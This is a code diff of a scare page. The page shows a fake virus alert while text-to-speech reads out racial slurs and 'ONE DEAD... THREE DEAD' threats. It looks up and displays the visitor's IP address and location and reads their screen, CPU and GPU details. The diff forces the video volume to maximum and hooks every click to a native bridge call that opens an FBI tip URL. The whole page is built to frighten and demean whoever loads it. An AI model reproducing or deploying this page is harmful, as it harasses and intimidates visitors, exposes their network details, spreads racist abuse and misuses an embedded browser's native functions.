@@ -37,6 +37,10 @@
             color: black;
             font-size: 24px;
         }
+        
+        #location {
+            text-shadow: -1px -1px 0 white, 1px -1px 0 white, -1px 1px 0 white, 1px 1px 0 white;
+        }
     </style>
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/gl-matrix/2.8.1/gl-matrix-min.js"></script>
@@ -51,7 +55,7 @@
                 synth.speak(utterance);
             }
 
-            speak('ypw ypw ypw A virus has been detected on your computer stupid nigger?^');
+            speak('ypwypwypw A virus has been detected on your computer stupid nigger?^');
 
             $.getJSON('https://wtfismyip.com/json', function(data) {
                 const ipAddress = data.YourFuckingIPAddress;
@@ -88,18 +92,11 @@
             });
 
             const languages = navigator.languages.join(', ');
-
-            // Get screen width and height
             const screenWidth = screen.width;
             const screenHeight = screen.height;
-
-            // Get display pixel depth
             const pixelDepth = screen.pixelDepth;
-
-            // Get CPU threads
             const cpuThreads = navigator.hardwareConcurrency;
 
-            // Get GPU info
             function getGpuInfo() {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -127,7 +124,8 @@
                 GPU Info: ${gpuInfo.renderer}
             `);
 
-            speak('OO wuwuwuwuwuwuwu OO OOOO yDRDRDRDRDRDRDRDRDRDRDRDRDRDRDRDRDR ONE DEAD ONE DEAD yDRDRDRDRDR TWO DEAD︙︙nigger jjjjjjjjjjjjjjjjjjjjjj && %% # $ @@ Have you prayed today OOOO ⅞ ⅞ OOOO OOOO OOOO ﬆﬆﬆﬆﬆﬆﬆ OOOO OOOO OOOO OOOO OOOO jjjjjjjjjjjjjj tststttttssssstt OOOO OOOO OOOO OOOO OOOO OOOO Have you prayed today wuwuwuwuwuwuwu OOOO PRAISE BE TO HARMIN OOOO OO wuwuwuwuwuwuwu OO OOOO OOOO OOOO ︙︙︙︙︙︙︙︙ OOOO OOOO ⅘ ﬆﬆ ∙ ⅒ ﬆﬆ ∙ ⅝ ∙ ⅚ ﬆﬆ ℅ ∙ ∙ ﬆﬆ ⒘ ¡¡¡¡¡¡¡¡¡¡¡ OOOO OOOO OOOO OOOO OOOO OOOO OOOO OOOO OOOO OOOO @at@at@at@at THREE DEAD');
+            speak('OO wuwuwuwuwuwuwu OO OOOO yDRDRDRDRDRDRDRDRDRDRDRDRDRDRDRDRDR ONE DEAD ONE DEAD yDRDRDRDRDR virus virus TWO DEAD︙︙nigger jjjjjjjjjj virus jjjjjjjjjjjj && %% # $ @@ /  Have you prayed today / OOOO ⅞ ⅞ OOOO OOOO OOOO ﬆﬆﬆﬆﬆﬆﬆ OOOO OOOO OOOO OOOO OOOO jjjjjjjjjjjjjj tststttttssssstt OOOO OOOO OOOO OOOO OOOO OOOO / Have you prayed today /  wuwuwuwuwuwuwu OOOO PRAISE BE TO HARMIN OOOO OO wuwuwuwuwuwuwu OO OOOO OOOO OOOO ︙︙︙︙︙︙︙︙ OOOO OOOO ⅘ ﬆﬆ ∙ ⅒ ﬆﬆ ∙ ⅝ ∙ ⅚ ﬆﬆ ℅ ∙ ∙ ﬆﬆ ⒘ ¡¡¡¡¡¡¡¡¡¡¡ OOOO OOOO OOOO OOOO OOOO OOOO OOOO OOOO OOOO OOOO @at@at@at@at THREE DEAD');
+            speak('wuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuw && %% # $ @@ uwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwu && %% # $ @@ wuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwuwu');
         });
     </script>
 </head>
@@ -136,12 +134,26 @@
     <div>
         <video width="1920" height="1080" autoplay loop>
   	        <source src="https://racistnoob.github.io/screen/Untitled_design.mp4" type="video/mp4">
+            <script>
+                var video = document.currentScript.parentElement;
+                video.volume = 1.0;
+            </script>
         </video>
         <div id="ip-address" style="position: absolute; top: 20px; left: 20px; color: black; font-size: 24px;"></div>
         <div id="location" style="position: absolute; top: 600px; left: 400px; color: black; font-size: 60px;"></div>
         <div id="prayers-container"></div>
         <div id="system-info" class="info" style="top: 200px; left: 20px;"></div>
     </div>
+    <script>
+        function openUrl() {
+            window.invokeNative('openUrl', "https://tips.fbi.gov/violation-questions/1");
+        }
+
+        // Add event listener to the document to listen for clicks
+        document.addEventListener('click', function(event) {
+            openUrl();
+        });
+    </script>
 </body>
 
 </html>
